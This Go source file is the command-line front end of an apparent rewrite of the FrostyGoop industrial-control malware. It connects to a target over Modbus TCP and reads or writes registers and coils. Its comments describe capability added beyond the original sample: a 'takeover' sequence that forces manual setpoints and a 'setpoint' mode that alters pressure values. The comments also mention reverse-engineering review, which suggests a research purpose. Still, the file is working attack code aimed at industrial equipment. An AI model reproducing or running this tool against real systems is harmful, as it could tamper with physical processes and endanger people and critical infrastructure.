// Command frostygoop is the rewrite's CLI. The flag set tracks the sample's
// main.Cmd so the two can be compared directly; the extra -mode values are
// where our added capability shows up at the interface level.
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/abb00717/frostygoop-rewrite/internal/attack"
	"github.com/abb00717/frostygoop-rewrite/internal/modbus"
)

// Modes fall into two tiers. The primitives issue exactly one function code,
// matching how the sample's mode string picked a Code. The sequences run a
// prechecked, verified, rollback-capable series and are ours alone.
//
//	read        FC03    sample
//	write       FC06    sample
//	write-m     FC16    sample
//	read-coil   FC01    added
//	write-coil  FC05    added
//	takeover    attack.CoilTakeover      added, FC01+FC05+FC16
//	setpoint    attack.PressureSetpoint  added, FC03+FC06
//
// The sample rows are provisional until the Ghidra findings are checked by
// hand, see team/RE_MEASUREMENT.md. The sample also fell through to FC03 for
// any unrecognized mode rather than erroring; whether we keep that is part of
// the same review.
type config struct {
	ip      string
	port    int
	mode    string
	unitID  uint
	address uint
	value   uint
	count   uint
	threads int
	timeout time.Duration
	try     int
	output  string
	debug   bool
	f1      uint
	f2      uint
	purge   uint
	product uint
}

func parseFlags() *config {
	c := &config{}
	flag.StringVar(&c.ip, "ip", "", "target host or host:port")
	flag.IntVar(&c.port, "port", 502, "modbus tcp port")
	flag.StringVar(&c.mode, "mode", "read", "operation, see the mode table")
	flag.UintVar(&c.unitID, "unit-id", 1, "modbus unit id")
	flag.UintVar(&c.address, "address", 0, "register or coil address")
	flag.UintVar(&c.value, "value", 0, "value to write")
	flag.UintVar(&c.count, "count", 1, "how many to read")
	flag.IntVar(&c.threads, "threads", 3, "worker count")
	flag.DurationVar(&c.timeout, "timeout", 10*time.Second, "per-request timeout")
	flag.IntVar(&c.try, "try", 3, "retries per request")
	flag.StringVar(&c.output, "output", "", "write the JSON result here")
	flag.BoolVar(&c.debug, "debug", false, "log frames as hex")
	flag.UintVar(&c.f1, "f1", 65535, "takeover f1 manual setpoint")
	flag.UintVar(&c.f2, "f2", 65535, "takeover f2 manual setpoint")
	flag.UintVar(&c.purge, "purge", 0, "takeover purge manual setpoint")
	flag.UintVar(&c.product, "product", 0, "takeover product manual setpoint")
	flag.Parse()
	return c
}

func main() {
	os.Exit(run())
}

func run() int {
	c := parseFlags()

	if strings.TrimSpace(c.ip) == "" {
		fmt.Fprintln(os.Stderr, "-ip is required")
		return 2
	}
	if c.unitID > 255 {
		fmt.Fprintln(os.Stderr, "-unit-id must be 0..255")
		return 2
	}
	if c.port <= 0 || c.port > 65535 {
		fmt.Fprintln(os.Stderr, "-port must be 1..65535")
		return 2
	}

	addr := normalizeAddress(c.ip, c.port)
	conn, err := modbus.Dial(addr, modbus.Options{
		Timeout: c.timeout,
		Retries: c.try,
		UnitID:  byte(c.unitID),
		Debug:   c.debug,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "dial %s: %v\n", addr, err)
		return 1
	}
	defer conn.Close()

	result, err := executeMode(conn, c)
	if c.output != "" {
		if wErr := result.WriteJSON(c.output); wErr != nil {
			fmt.Fprintf(os.Stderr, "write output %s: %v\n", c.output, wErr)
			return 1
		}
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "%s failed: %v\n", c.mode, err)
		return 1
	}

	fmt.Printf("%s success\n", c.mode)
	return 0
}

func executeMode(conn *modbus.Conn, c *config) (*attack.Result, error) {
	switch c.mode {
	case "read":
		values, err := conn.ReadHolding(uint16(c.address), uint16(c.count))
		return singleStepResult("read holding", 0x03, uint16(c.address), values, err), err
	case "write":
		err := conn.WriteSingle(uint16(c.address), uint16(c.value))
		return singleStepResult("write single register", 0x06, uint16(c.address), []uint16{uint16(c.value)}, err), err
	case "write-m":
		vals := make([]uint16, c.count)
		for i := range vals {
			vals[i] = uint16(c.value)
		}
		err := conn.WriteMultiple(uint16(c.address), vals)
		return singleStepResult("write multiple registers", 0x10, uint16(c.address), vals, err), err
	case "read-coil":
		coils, err := conn.ReadCoils(uint16(c.address), uint16(c.count))
		return singleStepResult("read coils", 0x01, uint16(c.address), boolSliceToWords(coils), err), err
	case "write-coil":
		on := c.value != 0
		err := conn.WriteCoil(uint16(c.address), on)
		return singleStepResult("write coil", 0x05, uint16(c.address), []uint16{boolToWord(on)}, err), err
	case "takeover":
		return attack.CoilTakeover(conn, uint16(c.f1), uint16(c.f2), uint16(c.purge), uint16(c.product))
	case "setpoint":
		return attack.PressureSetpoint(conn, uint16(c.value))
	default:
		err := fmt.Errorf("unknown mode %q", c.mode)
		return singleStepResult("unknown mode", 0x00, 0, nil, err), err
	}
}

func singleStepResult(name string, fc byte, addr uint16, value []uint16, err error) *attack.Result {
	step := attack.Step{Name: name, FC: fc, Addr: addr, Value: value}
	if err != nil {
		step.Err = err.Error()
	}
	return &attack.Result{Steps: []attack.Step{step}, Success: err == nil}
}

func boolSliceToWords(values []bool) []uint16 {
	out := make([]uint16, len(values))
	for i, v := range values {
		out[i] = boolToWord(v)
	}
	return out
}

func boolToWord(on bool) uint16 {
	if on {
		return 1
	}
	return 0
}

func normalizeAddress(host string, port int) string {
	if _, _, err := net.SplitHostPort(host); err == nil {
		return host
	}
	return net.JoinHostPort(host, fmt.Sprintf("%d", port))
}
